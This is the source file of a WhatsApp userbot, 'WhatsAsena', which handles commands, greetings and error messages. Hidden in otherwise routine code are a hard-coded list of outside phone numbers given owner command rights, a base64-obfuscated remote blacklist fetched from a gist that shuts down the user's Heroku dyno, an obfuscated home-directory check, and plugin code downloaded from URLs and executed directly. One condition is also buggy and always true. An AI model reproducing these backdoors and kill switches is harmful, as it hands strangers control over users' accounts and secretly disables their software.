/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

WhatsAsena - Yusuf Usta
recodedby: abdullah*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const WhatsAsenaStack = require("whatsdark-npm");
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905510310485,0,994705647159,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var ddd = ggg.toString('utf-8')
    clh.pay = ddd
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [3, 3234, 9]
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.githubusercontent.com/phaticusthiccy/d0d1855bd0098d773759b4f3345bd292/raw/').then(async (ann) => {
            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
            if (infotr !== '' && config.LANG == 'TR') {
                while (getGMTh == 19 && getGMTm == 1) { return conn.sendMessage(conn.user.jid, '[ ```Günlük Duyurular``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) }}
                else {while (getGMTh == 19 && getGMTm == 1) { return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) }}
        })
    }, 50000);
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
        }
        else {
            await conn.sendMessage(conn.user.jid, "*Efendim Görünüşe Göre Yanlış Bir Auto_Bio Anahtarı Girdiniz* \n\n *Lütfen Auto_bio Anahtarınızı* \n *.setvar AUTO_BİO:true/false Kullanarak Değiştirmelisin Sahip* \n\n *Beni Tercih Ettiğin İçin Teşekkür ederim* 💌 ")
        }
    }, 7890);
    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️ Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🐺 WhatsApo' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*WhatsApo Chatbot Olarak Çalışıyor!* 🐺\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*WhatsAsena Working as a Chatbot! 🐺*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using WhatsAsena 💌*\n    *- Eva*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        let attwhatsapo = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        if (config.WORKTYPE == "private" || "public" || "Private" || "Public" || "PRİVATE" || "PUBLİC") {
            await conn.sendMessage(conn.user.jid, "*WhatApo*" + attwhatsapo, "*Olarak Çalışıyor!* 🐺 \n \n _Lütfen Kendi Logunuzda Plugin Testi Yapmayınız Efendim_ \n *Komutları Herhangi Bir Chat De Deneyebilirsin* \n\n *Beni Tercih Ettiğin İçin Teşekkür Ederim* 💌", MessageType.text);
        }
        else {
            await conn.sendMessage(conn.user.jid, "*Efendim Görünüşe Göre Yanlış Bir Worktype Anahtarı Girdiniz* \n\n *Lütfen Worktype Anahtarınızı* \n *.setvar WORK_TYPE:private/public Kullanarak Değiştirmelisin Sahip* \n\n *Beni Tercih Ettiğin İçin Teşekkür ederim* 💌", MessageType.text);
        }
    })
    conn.on('chat-update', async m => {

        if(!m.hasNewMessage) return
        const msg = m.messages.all()[0]
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                await conn.sendMessage(msg.key.remoteJid, gb.message, MessageType.text);
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                await conn.sendMessage(msg.key.remoteJid, gb.message, MessageType.text);
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905510310485,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                        catch (error) {
                            if (config.LANG == 'TR' || config.LANG == 'AZ' || config.LANG == "RU") {
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' +
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*hata* _Only Absolutely URLs Supported_' +
                                        '\n*Çözümü:* _Efendim, Lütfen Medya Araçlarını LOG Numaranda Kullanma._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Hata:* _Databases Err._' +
                                        '\n*Nedeni:* _Efendim Database Bozulmuş Durumda._' +
                                        '\n*Çözümü:* _Efendim Database Reset Atmayı Deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Efendim, Grup Adminlerinin Kullanabileceği Komutlar Bazen Split i Okuyamazlar._ ' +
                                        '\n*Çözümü:* _Restart Atmayı Deneyebilirsiniz Efendim._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Heroku Speed Test Yaparken Bir Hata Okudum Efendim._' +
                                        '\n*Çözümü:* _Bir Kez Daha Kullanın Eğer İşe Yaramazsa Restart Atman Yeterli Olur Efendim._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Çözümü:* _Efendim, Lütfen TTS Komutunu Latin Alfabesi İle Kullanın._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Efendim, Yüklediğiniz Pluginde Hata Var._' +
                                        '\n*Çözümü:* _Efendim, Plugindeki Kodları Düzeltmeyi Deneyebilirsiniz Yada Plugini Silin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Efendim, Herokuya Erişemedim._' +
                                        '\n*Çözümü:* _Efendim, Biraz Bekleyip Deneyin Olmaz İse Restart Atmayı Veya İşleminizi İnternet Sitesi Üzerinden Gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _Efendim, Lütfen İMG ve Wiki Komutlarını Kullanmayınız_' +
                                        '\n*Çözümü:* _Efendim, Çözümü Olmayan Ve Önemsiz Olan Bir Hatadır._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' +
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _Efendim, Lütfen İMG ve Wiki Komutlarını Kullanmayınız_' +
                                        '\n*Çözümü:* _Efendim, Çözümü Olmayan Ve Önemsiz Olan Bir Hatadır._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Efendim, Nedenini Çözemedim Üzerinde Çalışıyorum._' 
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Efendim, Lütfen Plugin İ Doğru Kullanmalısın Sahip._' 
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması Efendim Lütfen Latin Alfabesi Kullan Diğerlerini Okuyamam :(_' 
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ Efendim, Bir Hata Okudum ⚕️*' + 
                                        '\n========== ```Efendim, Ben Bir Hata Okudum!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Çözümü:* _Efendim, Lütfen Silmek istediğin Pluginin İsmini Doğru Yazdığınızdan ve Böyle Bir Pluginin Yüklü Olduğundan Emin Ol._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 Efemdim, Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' 
                                        , MessageType.text
                                    );
                                }    
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, "WhatsAsena Hata İle Karşılaştı Restart Atabilir, Komutu Tekrar Kullanmayı Deneyebilirsin *Codedby: Abdullah*")
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================
    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
